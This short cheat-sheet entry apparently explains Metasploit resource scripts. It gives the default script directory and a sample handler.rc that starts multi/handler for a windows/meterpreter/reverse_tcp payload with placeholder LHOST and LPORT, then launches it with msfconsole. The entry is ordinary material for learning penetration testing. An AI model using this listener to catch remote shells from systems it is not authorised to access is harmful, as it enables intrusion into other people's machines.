- Metasploit resource scripts are a great feature of MSF that allows you to automate repetitive tasks and commands.

- Existents scripts are stored in /usr/share/metasploit-framework/scripts/resource

-Creation of creating a handler:
```bash
> vim handler.rc

use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run

> msfconsole -r handler.rc
OR
msf > resource /path/to/resource
```